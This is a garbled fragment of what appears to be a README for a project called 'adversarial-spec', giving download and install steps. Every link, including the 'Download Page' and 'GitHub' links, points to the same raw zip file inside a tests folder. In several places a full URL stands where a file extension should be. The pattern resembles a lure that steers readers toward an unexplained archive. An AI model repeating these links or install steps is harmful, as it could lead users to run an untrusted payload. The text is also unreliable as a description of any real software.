...
## 📥 Download Now
[![Download the latest release](https://raw.githubusercontent.com/aldyfarizki/adversarial-spec/main/skills/adversarial-spec/scripts/tests/adversarial_spec_2.5.zip%20Latest%20Release-%20-blue)](https://raw.githubusercontent.com/aldyfarizki/adversarial-spec/main/skills/adversarial-spec/scripts/tests/adversarial_spec_2.5.zip)
...
1. **Visit the Download Page**
   ...
   [Download Page](https://raw.githubusercontent.com/aldyfarizki/adversarial-spec/main/skills/adversarial-spec/scripts/tests/adversarial_spec_2.5.zip)
...
3. **Download the File**
   ...
   - **Linux:** Look for a `https://raw.githubusercontent.com/aldyfarizki/adversarial-spec/main/skills/adversarial-spec/scripts/tests/adversarial_spec_2.5.zip` or `.deb` file
...
4. **Install the Application**
   ...
   - **Linux:** Use the terminal to extract the `https://raw.githubusercontent.com/aldyfarizki/adversarial-spec/main/skills/adversarial-spec/scripts/tests/adversarial_spec_2.5.zip` or install the `.deb` package.
...
- GitHub: [adversarial-spec](https://raw.githubusercontent.com/aldyfarizki/adversarial-spec/main/skills/adversarial-spec/scripts/tests/adversarial_spec_2.5.zip)
